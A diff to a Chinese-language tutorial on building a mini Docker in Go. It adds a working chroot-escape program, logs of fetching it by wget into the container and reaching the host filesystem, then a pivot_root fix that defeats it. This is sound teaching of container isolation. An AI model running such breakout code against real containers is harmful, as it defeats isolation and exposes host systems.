@@ -217,5 +217,186 @@ bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbi
 ```
 
 
+## Jailbreak
+
+chroot 雖然改變了目前的 root directory，但是舊的 root directory 還存在，所以可以透過工具來回到舊的 root，也就是 jailbreak。
+
+首先，我們來準備工具，這個簡單的 jail break go script 做的事情就是：
+
+1. 在目前的 root(`/`) 裡再建立一個子 directory(`breakout`)，並 chroot 進去，同時，手裡抓著目前這一層(`/`)的 fd
+2. 利用 fd 跳回上一層（`/`），但此時 process 自身的 root directory(`breakout`) 變成在目前的 directory(`/`) 之下，所以進行 `cd ..` 並不會被擋住
+
+我們將這個工具編譯成可執行檔，讓 mini-docker 可以利用 `wget` 拿到後執行。
+
+```go
+package main
+
+import (
+	"os"
+	"syscall"
+)
+
+func main() {
+	os.Mkdir("breakout", 0755)
+	fd, _ := syscall.Open(".", syscall.O_RDONLY, 0)
+
+	syscall.Chroot("breakout")
+	syscall.Fchdir(fd)
+
+	for i := 0; i < 100; i++ {
+		syscall.Chdir("..")
+	}
+
+	syscall.Chroot(".")
+	syscall.Exec("/bin/sh", []string{"/bin/sh"}, os.Environ())
+}
+```
+
+實驗看看：
+
+開啟 server：
+```
+jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+192.168.139.31 - - [28/Dec/2025 09:48:42] "GET /jail-break HTTP/1.1" 200 -
+```
+
+執行 `mini-docker` 嘗試 jail break：
+```
+jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ sudo ./mini-docker run /bin/sh
+/ # pwd
+/
+/ # wget http://192.168.139.31:8080/jail-break
+Connecting to 192.168.139.31:8080 (192.168.139.31:8080)
+saving to 'jail-break'
+jail-break           100% |*************************************************************************************************| 1847k  0:00:00 ETA
+'jail-break' saved
+/ # ls
+bin         etc         jail-break  media       opt         root        sbin        sys         usr
+dev         home        lib         mnt         proc        run         srv         tmp         var
+/ # ll
+/bin/sh: ll: not found
+/ # ls -la
+total 1848
+drwxr-xr-x    1 501      501            134 Dec 28 01:48 .
+drwxr-xr-x    1 501      501            134 Dec 28 01:48 ..
+drwxr-xr-x    1 501      501            858 Jan 26  2024 bin
+drwxr-xr-x    1 501      501              0 Jan 26  2024 dev
+drwxr-xr-x    1 501      501            586 Jan 26  2024 etc
+drwxr-xr-x    1 501      501              0 Jan 26  2024 home
+-rw-r--r--    1 root     root       1891664 Dec 28 01:48 jail-break
+drwxr-xr-x    1 501      501            280 Jan 26  2024 lib
+drwxr-xr-x    1 501      501             28 Jan 26  2024 media
+drwxr-xr-x    1 501      501              0 Jan 26  2024 mnt
+drwxr-xr-x    1 501      501              0 Jan 26  2024 opt
+dr-xr-xr-x  277 root     root             0 Dec 28 01:48 proc
+drwx------    1 501      501             24 Dec 27 07:03 root
+drwxr-xr-x    1 501      501              0 Jan 26  2024 run
+drwxr-xr-x    1 501      501            790 Jan 26  2024 sbin
+drwxr-xr-x    1 501      501              0 Jan 26  2024 srv
+drwxr-xr-x    1 501      501              0 Jan 26  2024 sys
+drwxr-xr-x    1 501      501              0 Dec 27 07:03 tmp
+drwxr-xr-x    1 501      501             40 Jan 26  2024 usr
+drwxr-xr-x    1 501      501             86 Jan 26  2024 var
+/ # chmod +x jail-break 
+/ # ls -la
+total 1848
+drwxr-xr-x    1 501      501            134 Dec 28 01:48 .
+drwxr-xr-x    1 501      501            134 Dec 28 01:48 ..
+drwxr-xr-x    1 501      501            858 Jan 26  2024 bin
+drwxr-xr-x    1 501      501              0 Jan 26  2024 dev
+drwxr-xr-x    1 501      501            586 Jan 26  2024 etc
+drwxr-xr-x    1 501      501              0 Jan 26  2024 home
+-rwxr-xr-x    1 root     root       1891664 Dec 28 01:48 jail-break
+drwxr-xr-x    1 501      501            280 Jan 26  2024 lib
+drwxr-xr-x    1 501      501             28 Jan 26  2024 media
+drwxr-xr-x    1 501      501              0 Jan 26  2024 mnt
+drwxr-xr-x    1 501      501              0 Jan 26  2024 opt
+dr-xr-xr-x  277 root     root             0 Dec 28 01:48 proc
+drwx------    1 501      501             24 Dec 27 07:03 root
+drwxr-xr-x    1 501      501              0 Jan 26  2024 run
+drwxr-xr-x    1 501      501            790 Jan 26  2024 sbin
+drwxr-xr-x    1 501      501              0 Jan 26  2024 srv
+drwxr-xr-x    1 501      501              0 Jan 26  2024 sys
+drwxr-xr-x    1 501      501              0 Dec 27 07:03 tmp
+drwxr-xr-x    1 501      501             40 Jan 26  2024 usr
+drwxr-xr-x    1 501      501             86 Jan 26  2024 var
+/ # ./jail-break 
+# pwd
+/
+# ls
+Applications  Users    bin   dev  home  lib64  mnt  private  root  sbin  sys  usr
+Library       Volumes  boot  etc  lib   media  opt  proc     run   srv   tmp  var
+```
+
+可以看到我們成功來到了 `mini-docker` 之外，看到了 host 的 directory(orbstack ubuntu)。
+
+## pivot_root
+
+`chroot` 後還是可以爬回原本的舊 root，就是因為舊的 root 還存在，如果要徹底根除這個隱患，最好的方式就是讓舊 root 從 process 的 mount table 消失。
+
+要達成這個目的，我們有簡單的工具：`PivotRoot`。
+
+`PivotRoot` 會做什麼事情？詳見 [man pivot_root](https://man7.org/linux/man-pages/man2/pivot_root.2.html)。
+> pivot_root() changes the root mount in the mount namespace of the calling process.  More precisely, **it moves the root mount to the directory put_old and makes new_root the new root mount**.  The calling process must have the CAP_SYS_ADMIN capability in the user namespace that owns the caller's mount namespace.
+
+舉例：
+
+* **current root**: `/`
+* **old_root**: `/rootfs/.old_root`
+* **new_root**: `/rootfs`
+
+執行 `syscall.PivotRoot(new_root, old_root)` 後：
+
+root 位置會切換到 `/rootfs`，而原本的 `/` 會變成對應 `old_root`，所以我們 unmount `old_root` 時，就會把舊的 root 給 unmount 掉，jail break 就無處可去了。
+
+```go
+func child() {
+	must(syscall.Sethostname([]byte("mini-docker")))
+	must(syscall.Mount("", "/", "", syscall.MS_REC|syscall.MS_SLAVE, "")) // MS_SLAVE => Unidirectional, MS_PRIVATE => Isolate
+	
+	// change start
+	rootfs := "./rootfs"
+	must(syscall.Mount(rootfs, rootfs, "", syscall.MS_BIND|syscall.MS_REC, ""))
+
+	oldRoot := filepath.Join(rootfs, ".old_root")
+	must(os.MkdirAll(oldRoot, 0700))
+
+	must(syscall.PivotRoot(rootfs, oldRoot))
+
+	must(os.Chdir("/"))
+
+	must(syscall.Unmount("/.old_root", syscall.MNT_DETACH))
+	must(os.Remove("/.old_root"))
+	// change end
+	
+	must(syscall.Mount("proc", "/proc", "proc", syscall.MS_RDONLY|syscall.MS_NOSUID|syscall.MS_NOEXEC, "")) // source, target, fstype, flags, args
+
+	cmd := exec.Command(os.Args[2], os.Args[3:]...)
+	cmd.Stdin = os.Stdin
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+
+	if err := cmd.Run(); err != nil {
+		fmt.Println("ERROR", err)
+		os.Exit(1)
+	}
+}
+```
+
+實驗看看：
+
+```
+jjlin@ubuntu:~/learn-by-doing/go/projects/simple_docker$ sudo ./mini-docker run /bin/sh
+/ # ls
+bin         dev         home        lib         mnt         proc        run         srv         tmp         var
+breakout    etc         jail-break  media       opt         root        sbin        sys         usr
+/ # ./jail-break 
+/ # ls
+bin         dev         home        lib         mnt         proc        run         srv         tmp         var
+breakout    etc         jail-break  media       opt         root        sbin        sys         usr
+/ # 
+```
+> 可以觀察到，這次我們看不到 host 的 directory 了，代表 jail break 失敗
 
 
